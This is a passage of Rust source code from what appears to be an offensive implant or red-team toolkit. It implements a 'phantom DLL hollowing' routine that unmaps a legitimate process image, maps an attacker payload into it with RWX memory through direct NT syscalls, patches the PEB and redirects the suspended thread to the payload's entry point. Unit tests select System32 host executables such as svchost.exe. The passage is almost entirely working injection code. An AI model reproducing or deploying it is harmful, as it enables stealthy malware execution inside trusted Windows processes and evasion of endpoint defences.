        std::mem::size_of::<usize>(),
    ) {
        terminate_and_cleanup!();
        close_handle!(h_section);
        let _ = crate::syscall!(
            "NtUnmapViewOfSection",
            NT_CURRENT_PROCESS as u64,
            local_base as u64,
        );
        return Err(anyhow!(
            "phantom_dll_hollow: failed to read PEB.ImageBaseAddress"
        ));
    }

    // Unmap the host's original image.
    if remote_image_base != 0 {
        let us = crate::syscall!(
            "NtUnmapViewOfSection",
            h_process as u64,
            remote_image_base as u64,
        )
        .unwrap_or(-1);
        if us < 0 {
            tracing::warn!(
                "phantom_dll_hollow: NtUnmapViewOfSection NTSTATUS {:#010x}; continuing",
                us as u32
            );
        }
    } else {
        tracing::warn!("phantom_dll_hollow: remote_image_base is NULL; skipping unmap");
    }

    // Map the phantom section into the host process at the original image base.
    let mut remote_base: *mut c_void = remote_image_base as *mut c_void;
    let mut remote_view_size: usize = 0;
    let map_result = crate::syscall!(
        "NtMapViewOfSection",
        h_section as u64,
        h_process as u64,
        &mut remote_base as *mut _ as u64,
        0u64,
        0u64,
        std::ptr::null_mut::<u64>() as u64,
        &mut remote_view_size as *mut _ as u64,
        1u64, // ViewUnmap
        0u64,
        PAGE_EXECUTE_READWRITE as u64, // initially RWX; we'll tighten per-section later
    );
    let mapped_ok = match map_result {
        Ok(st) if st >= 0 && !remote_base.is_null() => true,
        _ => false,
    };

    if !mapped_ok {
        // Retry without specifying a base address (let the kernel choose).
        remote_base = std::ptr::null_mut();
        remote_view_size = 0;
        let retry_result = crate::syscall!(
            "NtMapViewOfSection",
            h_section as u64,
            h_process as u64,
            &mut remote_base as *mut _ as u64,
            0u64,
            0u64,
            std::ptr::null_mut::<u64>() as u64,
            &mut remote_view_size as *mut _ as u64,
            1u64,
            0u64,
            PAGE_EXECUTE_READWRITE as u64,
        );
        match retry_result {
            Ok(st) if st >= 0 && !remote_base.is_null() => {}
            Ok(st) => {
                terminate_and_cleanup!();
                close_handle!(h_section);
                let _ = crate::syscall!(
                    "NtUnmapViewOfSection",
                    NT_CURRENT_PROCESS as u64,
                    local_base as u64,
                );
                return Err(anyhow!(
                    "phantom_dll_hollow: NtMapViewOfSection(remote) NTSTATUS {:#010x}",
                    st as u32
                ));
            }
            Err(e) => {
                terminate_and_cleanup!();
                close_handle!(h_section);
                let _ = crate::syscall!(
                    "NtUnmapViewOfSection",
                    NT_CURRENT_PROCESS as u64,
                    local_base as u64,
                );
                return Err(anyhow!(
                    "phantom_dll_hollow: NtMapViewOfSection(remote) failed: {e}"
                ));
            }
        }
    }
    let remote_base_usize = remote_base as usize;

    // Unmap the local view — we're done writing to the section.
    let _ = crate::syscall!(
        "NtUnmapViewOfSection",
        NT_CURRENT_PROCESS as u64,
        local_base as u64,
    );

    // Close the section handle — the mapping persists in the target process.
    close_handle!(h_section);

    // Apply relocations if the image was loaded at a different base.
    let delta = remote_base_usize as isize - preferred_base as isize;
    if delta != 0 {
        apply_relocations_remote(h_process, remote_base_usize, nt, payload, delta)?;
    }

    // Rebuild the Import Address Table.
    fix_iat_remote(h_process, remote_base_usize, nt, payload)?;

    // Apply per-section memory protections.
    apply_section_protections(h_process, remote_base_usize, nt);

    // Flush instruction cache.
    let _ = crate::syscall!(
        "NtFlushInstructionCache",
        h_process as u64,
        remote_base as u64,
        (*nt).OptionalHeader.SizeOfImage as u64,
    );

    // Update PEB.ImageBaseAddress.
    if !nt_write_exact(
        h_process,
        peb_ptr.add(0x10) as usize,
        &remote_base_usize as *const _ as *const c_void,
        std::mem::size_of::<usize>(),
    ) {
        tracing::warn!("phantom_dll_hollow: failed to update PEB.ImageBaseAddress");
    }

    // ── Phase 4: Set thread context and resume ───────────────────────────
    let mut ctx: CONTEXT = std::mem::zeroed();
    ctx.ContextFlags = CONTEXT_FULL;

    let get_ctx = crate::syscall!(
        "NtGetContextThread",
        h_thread as u64,
        &mut ctx as *mut _ as u64,
    );
    match get_ctx {
        Ok(st) if st >= 0 => {
            let entry_point = (remote_base_usize + entry_point_rva) as u64;
            ctx.Rip = entry_point;

            let set_ctx = crate::syscall!(
                "NtSetContextThread",
                h_thread as u64,
                &ctx as *const _ as u64,
            );
            match set_ctx {
                Ok(st2) if st2 >= 0 => {}
                Ok(st2) => {
                    terminate_and_cleanup!();
                    return Err(anyhow!(
                        "phantom_dll_hollow: NtSetContextThread NTSTATUS {:#010x}",
                        st2 as u32
                    ));
                }
                Err(e) => {
                    terminate_and_cleanup!();
                    return Err(anyhow!(
                        "phantom_dll_hollow: NtSetContextThread failed: {}",
                        e
                    ));
                }
            }
        }
        Ok(st) => {
            terminate_and_cleanup!();
            return Err(anyhow!(
                "phantom_dll_hollow: NtGetContextThread NTSTATUS {:#010x}",
                st as u32
            ));
        }
        Err(e) => {
            terminate_and_cleanup!();
            return Err(anyhow!(
                "phantom_dll_hollow: NtGetContextThread failed: {}",
                e
            ));
        }
    }

    // Resume the host thread — execution begins at the phantom DLL's entry point.
    let resume = crate::syscall!("NtResumeThread", h_thread as u64, 0u64);
    match resume {
        Ok(st) if st >= 0 => {}
        Ok(st) => {
            terminate_and_cleanup!();
            return Err(anyhow!(
                "phantom_dll_hollow: NtResumeThread NTSTATUS {:#010x}",
                st as u32
            ));
        }
        Err(e) => {
            terminate_and_cleanup!();
            return Err(anyhow!("phantom_dll_hollow: NtResumeThread failed: {}", e));
        }
    }

    tracing::info!(
        "phantom_dll_hollow: phantom DLL ({} bytes) mapped at {:#x} in host process",
        payload.len(),
        remote_base_usize,
    );

    Ok(PhantomHollowResult {
        process_handle: h_process,
        thread_handle: h_thread,
        phantom_base: remote_base_usize,
    })
}

// ── Unit tests ───────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_rva_to_file_offset_headers() {
        // Minimal PE header: MZ + e_lfanew = 0x80.
        // At offset 0x80: PE\0\0 + IMAGE_FILE_HEADER + IMAGE_OPTIONAL_HEADER64.
        let mut buf = vec![0u8; 0x200];
        buf[0] = b'M';
        buf[1] = b'Z';
        // e_lfanew at 0x3C
        buf[0x3C..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
        // PE signature
        buf[0x80..0x84].copy_from_slice(b"PE\0\0");
        // Machine at 0x84 (IMAGE_FILE_HEADER +0)
        buf[0x84..0x86].copy_from_slice(&(0x8664u16).to_le_bytes()); // IMAGE_FILE_MACHINE_AMD64
        // NumberOfSections at 0x86
        buf[0x86..0x88].copy_from_slice(&(1u16).to_le_bytes());
        // SizeOfOptionalHeader at 0x94
        let opt_header_size = std::mem::size_of::<winapi::um::winnt::IMAGE_OPTIONAL_HEADER64>();
        buf[0x94..0x96].copy_from_slice(&(opt_header_size as u16).to_le_bytes());
        // Magic at 0x98 (OptionalHeader +0)
        buf[0x98..0x9A].copy_from_slice(&(0x020Bu16).to_le_bytes()); // PE64

        // Section header starts after OptionalHeader.
        let section_offset = 0x80 + 4 + std::mem::size_of::<IMAGE_FILE_HEADER>() + opt_header_size;
        let sec = &mut buf[section_offset..section_offset + std::mem::size_of::<IMAGE_SECTION_HEADER>()];
        // VirtualAddress at +12
        let va: u32 = 0x1000;
        sec[12..16].copy_from_slice(&va.to_le_bytes());
        // VirtualSize at +8
        let vs: u32 = 0x500;
        sec[8..12].copy_from_slice(&vs.to_le_bytes());
        // PointerToRawData at +20
        let raw: u32 = 0x200;
        sec[20..24].copy_from_slice(&raw.to_le_bytes());
        // SizeOfRawData at +16
        let raw_sz: u32 = 0x200;
        sec[16..20].copy_from_slice(&raw_sz.to_le_bytes());

        // RVA 0x1000 should map to file offset 0x200.
        assert_eq!(rva_to_file_offset(&buf, 0x1000), 0x200);
        // RVA 0x1200 (0x200 into section) should map to 0x400.
        assert_eq!(rva_to_file_offset(&buf, 0x1200), 0x400);
        // RVA 0x50 (header area) maps 1:1.
        assert_eq!(rva_to_file_offset(&buf, 0x50), 0x50);
    }

    #[test]
    fn test_rva_to_file_offset_no_mz() {
        let buf = vec![0u8; 0x100];
        // No MZ header → fallback to identity mapping.
        assert_eq!(rva_to_file_offset(&buf, 0x42), 0x42);
    }

    #[test]
    fn test_dos_to_nt_path() {
        let result = dos_to_nt_path(r"C:\Windows\System32\svchost.exe");
        let expected: Vec<u16> = r"\??\C:\Windows\System32\svchost.exe"
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        assert_eq!(result, expected);
    }

    #[test]
    fn test_dos_to_nt_path_already_nt() {
        let result = dos_to_nt_path(r"\??\C:\test.exe");
        let expected: Vec<u16> = r"\??\C:\test.exe"
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        assert_eq!(result, expected);
    }

    #[test]
    fn test_host_candidate_paths() {
        let paths = host_candidate_paths();
        assert!(!paths.is_empty());
        // All paths should contain "System32" and end with ".exe".
        for p in &paths {
            assert!(p.contains("System32"));
            assert!(p.ends_with(".exe"));
        }
    }
}
